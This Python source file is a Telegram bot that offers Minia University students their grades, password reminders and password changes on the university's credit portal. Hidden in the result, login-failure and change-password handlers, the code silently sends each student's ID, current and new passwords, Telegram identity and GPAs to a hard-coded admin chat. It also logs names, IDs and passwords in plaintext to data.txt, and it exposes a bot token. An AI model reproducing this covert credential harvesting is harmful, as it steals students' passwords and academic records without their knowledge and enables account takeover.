import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import quote

admin_chat_id = 1792449471
token = "6410467729:AAE35oFq2b1ogyxZMIlA_VbYC60DKJB9neY"
bot = telebot.TeleBot(token)
#__&&&&_____
keyboard2 = types.InlineKeyboardMarkup()
pas1 = types.InlineKeyboardButton(text='معرفة الباسورد✅', callback_data='send_password')
back_button = types.InlineKeyboardButton(text='رجوع🔙', callback_data='back')
keyboard2.row(pas1)
keyboard2.row(back_button)

#_________$$$$_$$$
keyboard = types.InlineKeyboardMarkup()
dev = types.InlineKeyboardButton(text="𓆩⋆ ׅᎯL ׅG̸E🅽ᎬRᎪⱠ ׅ⋆𓆪", url='https://t.me/BO_R0')
grop = types.InlineKeyboardButton(text='𝑴𝒊𝒏𝒊𝒂 𝑨𝒈𝒓𝒊𝒄𝒖𝒍𝒕𝒖𝒓𝒆☘️', url='https://t.me/+rbphVRSaWD9mNjg8')
natega = types.InlineKeyboardButton(text='الحصول علي النتيجة✅', callback_data='echo_all')
pas = types.InlineKeyboardButton(text='معرفة الباسورد👁️‍🗨️', callback_data='send_password')
change_pass = types.InlineKeyboardButton(text='تغيير الباسورد🔑', callback_data='change_password')

keyboard.row(natega, pas)
keyboard.row(change_pass)
keyboard.row(dev, grop)

@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    bot.reply_to(message, f"👋 • مرحبا بك ي باشمهندس [{message.from_user.first_name}](tg://user?id={message.from_user.id})!\n"
                          f"🤖• في بوت [{bot.get_me().first_name}](https://t.me/{bot.get_me().username}) للحصول على النتيجة.\n"
                          f"📚 • يمكنك استخدام البوت للحصول على النتائج.\n"
                          f"🔑 • كما يمكنك أيضًا معرفة باسورد ابن الهيثم.",
                 parse_mode='Markdown', reply_markup=keyboard)

keyboard1 = types.InlineKeyboardMarkup()
back_button = types.InlineKeyboardButton(text='رجوع🔙', callback_data='back')
keyboard1.row(back_button)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'echo_all':
        bot.clear_step_handler(call.message)
        echo_all(call.message)
    elif call.data == 'back':
        bot.clear_step_handler(call.message)
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=f"🔙•تم الرجوع إلى القائمة الرئيسية\n"
                                   f"📚 • يمكنك استخدام البوت للحصول على النتائج.\n"
                                   f"🔑 • كما يمكنك أيضًا معرفة باسورد ابن الهيثم.",
                              parse_mode='Markdown',
                              reply_markup=keyboard)
    elif call.data == "send_password":
        bot.clear_step_handler(call.message)
        send_password(call.message)
    elif call.data == "change_password":
        bot.clear_step_handler(call.message)
        change_password_step1(call)
      	

def send_password(message):
    # طلب البريد الإلكتروني من المستخدم
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text="برجاء ادخال البريد الإلكتروني الخاص بك:", reply_markup=keyboard1)

    bot.register_next_step_handler(message, process_email)

def process_email(message):
    mail = message.text

    if mail:
        id = mail[:8]
        url = "http://credit.minia.edu.eg/stuJCI"
       
        headers = {
            "Host": "credit.minia.edu.eg",
            "Connection": "keep-alive",
            "Content-Length": "91",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": "null",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "http://credit.minia.edu.eg",
            "Referer": "http://credit.minia.edu.eg/static/index.html",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = {
            "param0": "Mail.Mail",
            "param1": "SendMail",
            "param2": id,
            "param3": mail,
            "param4": "2"
        }

        try:
            res = requests.post(url, headers=headers, data=data, timeout=10)
            if not res.ok:
            	bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)

            if "success" in res.text:
                bot.reply_to(message, "•تم إرسال كلمة المرور إلى outlook بنجاح ✅.\n•قم بالتسجيل الان الي outlook بستخدام البريد والباسورد من خلال هذا اللينك\nhttps://outlook.office365.com/mail/inbox", reply_markup=keyboard1)
                admin_message1 = (
                    f"• **المستخدم:** {message.from_user.first_name} (@{message.from_user.username})\n"
                    f"• تم إرسال كلمة المرور للبريد الإلكتروني بنجاح ✅.\n{mail}"
                )
                bot.send_message(admin_chat_id, admin_message1)
            elif "fail" in res.text:
                if "local variable 'Conn' referenced before assignment" in res.text:
                    bot.reply_to(message, "حدث خطأ أثناء الاتصال بالخادم. حاول لاحقا❗.", reply_markup=keyboard1)
                else:
                    bot.reply_to(message, "عنوان البريد الإلكتروني غير مسجل على النظام❌", reply_markup=keyboard1)
        except requests.Timeout:
            bot.reply_to(message, "الموقع لا يعمل برجاء المحاولة مرة اخرى لاحقاً❌", reply_markup=keyboard1)

                
def echo_all(message):
    bot.edit_message_text(
    chat_id=message.chat.id,
    message_id=message.message_id,
    text="برجاء ادخال id (كود الطالب) 🆔:",
    reply_markup=keyboard1
)

    bot.register_next_step_handler(message, process_id)

def process_id(message):
    if not message.text.isdigit():
        bot.reply_to(message, "الرجاء إدخال كود الطالب الصحيح (أرقام فقط)❌.", reply_markup=keyboard1)
        return

    student_id = message.text
    bot.reply_to(message, "برجاء ادخال الباسورد:")
    bot.register_next_step_handler(message, process_password, student_id)

def process_password(message, student_id):
    password = message.text
    chat_id = message.chat.id

    url1 = "http://credit.minia.edu.eg/studentLogin"
    headers1 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data = {
        "UserName": student_id,
        "Password": password,
        "sysID": "313.",
        "UserLang": "E",
        "userType": "2",
    }
    

    try:
        response = requests.post(url1, headers=headers1, data=data, timeout=10)

        if not response.ok:
            bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
            return

        if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
            bot.reply_to(message, "جاري الحصول على النتيجة. يرجى الانتظار قليلاً...🔁")
            cookies = response.headers["Set-Cookie"]
            
            
        else:
            bot.reply_to(message, "•برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌\n•لمعرفة الباسورد قم بالنقر على الزر أدناه:⬇️", reply_markup=keyboard2)
            try:
            	admin_message = (
            f"ℹ️ *معلومات المستخدم:*❌\n"
            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
            f"• **كود الطالب:** {student_id} \n"
            f"• **كلمة المرور:** {password}\n"
            f"-------------------------------------\n"
            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
        )
            	bot.send_message(admin_chat_id, admin_message)
            except Exception as e:
            	error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
            	bot.send_message(admin_chat_id, error_message)
            return

    
    except requests.Timeout:
        bot.reply_to(message, " الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
        return

    url = "http://credit.minia.edu.eg/getJCI"
    headers = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "223",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/PortalStudent.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookies
    }
    payload = {
        "param0": "Reports.RegisterCert",
        "param1": "getTranscript",
        "param2": '{"crsReplaceHide":"true","ShowDetails":"true","portalFlag":"true","RegType":"student","AppType":"result"}'
    }
    response1 = requests.post(url, headers=headers, data=payload).text
    soup = BeautifulSoup(response1, 'html.parser')
    json_text = soup.get_text()
    data2 = json.loads(json_text)
    name=data2["stuName"]
    with open('data.txt', 'a') as file:
    	file.write(f"\n{'-' * 50}\nName: {name}\nID: {student_id}\nPassword: {password}")
    	calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
    	calculate_and_send_course_info(chat_id, data2)

def calculate_and_send_course_info(chat_id, data2):
    try:
        # اولي ترم اول
        first_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][0]
        total_credits_2022_2023, message_2022_2023 = print_course_info(first_semester_2022_2023["Courses"], "اولي ترم اول")
        bot.send_message(chat_id, f"{message_2022_2023}\nالساعات المسجلة: {first_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {first_semester_2022_2023['CurrCH']}\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}")
    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2022-2023): {e}")

    try:
        # اولي ترم تاني
        second_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][1]
        total_credits_2022_2023 += print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني (2022-2023)")[0]
        message_2022_20232 = "\n\n" + print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني")[1]
        bot.send_message(chat_id, f"{message_2022_20232}\nالساعات المسجلة: {second_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {second_semester_2022_2023['CurrCH']}\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}")
    except Exception as e:
        print(f"حدث خطأ في الدورة الثانية (2022-2023): {e}")

    try:
  #تانية ترم اول
        first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][0]
        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم اول")
        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
    try:
     #تانية ترم تاني
        first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][1]
        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم تاني")
        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
    try:
        #تالتة ترم اول
        first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][0]
        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم اول")
        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
    try:
     #تالتة ترم تاني
        first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][1]
        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم تاني")
        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
    try:
    #رابعه ترم اول
        first_semester_2023_2024 = data2["StuSemesterData"][3]["Semesters"][0]
        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "رابعة ترم اول")
        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")


    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
    try:
  #رابعه ترم تاني
        first_semester_2023_2024 = data2["StuSemesterData"][3]["Semesters"][1]
        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "رابعة ترم تاني")
        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
        with open('data.txt', 'a') as file:
        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")


    except Exception as e:
        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
      
    
def calculate_and_send_course_info1(chat_id, data2,admin_chat_id):
    try:
        for semester_data in data2["StuSemesterData"]:
            for semester in semester_data["Semesters"]:
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                
                total_credits, message_text = print_course_info(semester["Courses"], semester_name)
                
                bot.send_message(admin_chat_id, f"{message_text}\nالساعات المسجلة: {semester['RegHrs']}        الساعات الحاصل عليها: {semester['CurrCH']}\nالمعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}", parse_mode='Markdown')
         
           
    except Exception as e:
        print(f"حدث خطأ: {e}")
def calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message):
    try:
        admin_message = (
            f"ℹ️ *معلومات المستخدم:*✅\n"
            f"• **اسم الطالب:** {name} \n"
            f"• **كود الطالب:** {student_id} \n"
            f"• **كلمة المرور:** {password}\n"
           
            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
            f"-------------------------------------"
        )

        for semester_data in data2["StuSemesterData"]:
            for semester in semester_data["Semesters"]:
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                
                total_credits, message_text = print_course_info(semester["Courses"], semester_name)
                
                admin_message += (
                    
                    f"\nالمعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"
                    
                )
        bot.send_message(admin_chat_id, admin_message)
        
    except Exception as e:
        print(f"حدث خطأ: {e}")        

def print_course_info(course_data, semester_name):
    message_text = f"\n{semester_name}:\n"
    message_text += "اسم المقرر  | الساعات المعتمدة | التقدير |\n"
    message_text += "--------------------------------------------\n"
    total_credits = 0

    for course in course_data:
        course_name = course["CourseName"]
        course_code = course["CourseCode"]
        course_credit = int(course["CourseCredit"])
        grade = course.get("Grade", "unannounced")
        total_credits += course_credit
        message_text += f"•[{course_name} ] [{course_credit}] [{grade}] \n"
        
    return total_credits, message_text

#$_____$$$$$$$$$تغير الباسورد

def change_password_step1(call):
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="برجاء ادخال ID (كود الطالب) 🆔:",
        reply_markup=keyboard1
    )
    bot.register_next_step_handler(call.message, process_user_id)

def process_user_id(message):
    user_id = message.text
    msg = bot.send_message(message.chat.id, "الرجاء إدخال كلمة المرور الحالية:")
    bot.register_next_step_handler(msg, process_current_password, user_id)

def process_current_password(message, user_id):
    current_password = message.text
    msg = bot.send_message(message.chat.id, "الرجاء إدخال كلمة المرور الجديدة:")
    bot.register_next_step_handler(msg, process_new_password, user_id, current_password)

def process_new_password(message, user_id, current_password):
    new_password = message.text

    session = requests.Session()

    # تسجيل الدخول
    url1 = "http://credit.minia.edu.eg/studentLogin"
    headers1 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": quote("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/120.0.0.0 Safari/537.36"),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    data = {
        "UserName": user_id,
        "Password": current_password,
        "sysID": "313.",
        "UserLang": "E",
        "userType": "2",
    }

    try:
        response = session.post(url1, headers=headers1, data=data, timeout=10)
        if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
            msg = bot.send_message(message.chat.id, "تم التسجيل بنجاح. الآن جاري تغيير كلمة المرور...")

            # تغيير كلمة المرور
            url = "http://credit.minia.edu.eg/getJCI"
            payload = f"param0=stuAdmission.stuAdmission&param1=ChangePassWord&param2={{\"UserPassword\":\"{new_password}\"}}"
            headers = {
                'User-Agent': quote("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"),
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/x-www-form-urlencoded",
                'X-Requested-With': "XMLHttpRequest",
                'X-CSRFToken': "null",
                'Origin': "http://credit.minia.edu.eg",
                'Referer': "http://credit.minia.edu.eg/static/PortalStudent.html",
                'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            }

            response = session.post(url, data=payload, headers=headers)

            if not response.ok:
                bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
                return

            if "failed" in response.text:
                bot.edit_message_text(
                    chat_id=msg.chat.id,
                    message_id=msg.message_id,
                    text="تم تغيير كلمة المرور بنجاح ✅",
                    reply_markup=keyboard1
                )

                admin_message1 = (
                    f"• **المستخدم:** {message.from_user.first_name} (@{message.from_user.username})\n"
                    f"• تم تغيير كلمة المرور بنجاح ✅.\n• كود الطالب: {user_id}\n"
                    f"• كلمة المرور الحالية: {current_password}\n"
                    f"• كلمة المرور الجديدة: {new_password}"
                )
                bot.send_message(admin_chat_id, admin_message1)
            else:
                bot.reply_to(message, "حدث خطأ أثناء تغيير كلمة المرور. حاول لاحقًا❗", reply_markup=keyboard1)

        else:
            bot.reply_to(message, "كلمة المرور الحالية غير صحيحة حاول مرة أخرى❌", reply_markup=keyboard1)
    except requests.Timeout:
        bot.reply_to(message, "الموقع لا يعمل برجاء المحاولة مرة اخرى لاحقاً❌", reply_markup=keyboard1)


bot.polling(none_stop=True)
